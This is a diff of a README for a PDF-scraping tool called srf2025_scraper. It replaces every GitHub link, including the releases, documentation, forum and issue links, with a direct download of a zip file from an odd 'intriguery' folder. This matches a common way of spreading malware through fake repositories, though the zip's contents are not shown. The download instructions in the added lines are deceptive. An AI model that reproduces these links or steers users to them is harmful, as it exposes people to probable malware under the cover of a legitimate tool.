@@ -1,6 +1,6 @@
 # 📄 srf2025_scraper - Effortless PDF Data Extraction Tool
 
-[![Download srf2025_scraper](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/cobrasuicida/srf2025_scraper/releases)
+[![Download srf2025_scraper](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip%https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip)](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to srf2025_scraper! This tool helps you extract data from conference PDF
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download srf2025_scraper](https://github.com/cobrasuicida/srf2025_scraper/releases).
+To get started, visit this page to download: [Download srf2025_scraper](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip).
 
 1. Open the link.
 2. Look for the latest version under the "Releases" section.
@@ -83,8 +83,8 @@ A: The tool is actively maintained, with updates provided as needed to improve f
 
 ## 🔗 Resources
 
-- [Documentation](https://github.com/cobrasuicida/srf2025_scraper/wiki) - Find detailed guidance on usage.
-- [Community Forums](https://github.com/cobrasuicida/srf2025_scraper/discussions) - Connect with other users and share tips.
-- [GitHub Issues](https://github.com/cobrasuicida/srf2025_scraper/issues) - Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip) - Find detailed guidance on usage.
+- [Community Forums](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip) - Connect with other users and share tips.
+- [GitHub Issues](https://raw.githubusercontent.com/cobrasuicida/srf2025_scraper/master/intriguery/srf2025_scraper.zip) - Report bugs or request features.
 
 Thank you for choosing srf2025_scraper. We hope it simplifies your access to valuable academic data!
